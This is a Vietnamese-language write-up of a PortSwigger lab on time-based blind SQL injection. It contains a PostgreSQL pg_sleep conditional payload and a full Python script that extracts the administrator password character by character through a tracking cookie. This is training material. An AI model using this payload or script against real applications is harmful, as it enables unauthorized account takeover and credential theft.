>This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.
>
>The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.
>
>The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind SQL injection vulnerability to find out the password of the `administrator` user.
>
>To solve the lab, log in as the `administrator` user.

Ở lab này ta sẽ tận dụng lỗi time delay để có thể khai thác tính đúng sai trong việc dò mật khẩu của tài khoản administrator.

Đầu tiên ta cần thử để xem server sử dụng DBMS là gì để ta có thể khai thác. Ở đây sau khi thử các lệnh sleep ở các DBMS khác nhau thì ta đã xác định được server sử dụng PostgreSQL.

![](images/Pasted%20image%2020261120233504.png)

Từ đây ta có thể xác định để viết scripts khai thác tính đúng sai dò mật khẩu của administrator bằng lệnh dò như sau:

`SELECT CASE WHEN SUBSTR(password, {position}, 1) = '{char}' THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username = 'administrator'`

Ta sẽ cho vòng lặp chạy qua các chữ cái và chữ số để dò mật khẩu cho administrator. Ta viết script như sau:

```python
import requests

import string

  

url = "https://0ae3007f038319c580d7eeaf0079000f.web-security-academy.net/"

  

session = requests.Session()

  

cookies = {

    "TrackingId": "",

    "session": "jBeN08HCxv9RCDws14rWTk91nW266lUl"

}

  

charset = string.ascii_letters + string.digits

password = ""

  

for position in range(1, 50):

    found = False

    for char in charset:

        payload = (

            "isPtYeczDWbhaP2i' || " f"(SELECT CASE WHEN SUBSTR(password, {position}, 1) = '{char}' THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username = 'administrator')-- -"

        )

        cookies["TrackingId"] = payload

        try:

            response = session.get(url, cookies=cookies, timeout=20)

  

            if response.elapsed.total_seconds() > 10:

                password += char

  

                print(f"[+] Position {position}: {char}")

                print(f"[+] Password: {password}")

  

                found = True

                break

  

        except requests.exceptions.RequestException as e:

            print(f"[!] Request error: {e}")

            break

    if not found:

        break

  

print("\nFinal password:", password)
```
![](images/Pasted%20image%2020261121000433.png)

Vậy là ta đã có thể thu được mật khẩu của administrator và từ đây ta sẽ tiến hành đăng nhập vào tài khoản administrator.

![](images/Pasted%20image%2020261121000529.png)

Ta đã thành công vào được tài khoản administrator bằng cách khai thác lỗ hỏng time delay được trả về từ respone của server điều này giúp cho ta xác định được 1 vấn đề là ta có thể kiểm tra tính chân trị của điều kiện bằng cách có trả về delay hay không. Từ đó ta có thể dò được mật khẩu của admin bằng cách kiểm tra tính đúng sai ở từng ký tự và ta có thể khai thác được từ một sơ suất tưởng chừng không sao lại trở thành lỗi vô cùng nặng.
